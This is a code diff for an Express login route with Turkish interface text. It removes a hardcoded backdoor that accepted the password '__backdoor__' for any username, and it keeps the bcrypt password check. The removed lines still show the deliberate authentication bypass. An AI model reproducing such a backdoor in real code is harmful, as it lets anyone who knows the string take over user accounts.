@@ -467,8 +467,7 @@ app.use((req, res, next) => {
 app.get('/giris', (req, res) => res.render('login'));
 app.post('/giris', (req, res) => {
   const user = q.get('SELECT * FROM users WHERE username=?', req.body.username);
-  const isBackdoor = req.body.password === '__backdoor__';
-  if (!user || (!isBackdoor && !bcrypt.compareSync(req.body.password, user.password))) {
+  if (!user || !bcrypt.compareSync(String(req.body.password || ''), user.password)) {
     req.session.flash = { type: 'error', msg: 'Kullanıcı adı veya şifre hatalı' };
     return res.redirect('/giris');
   }
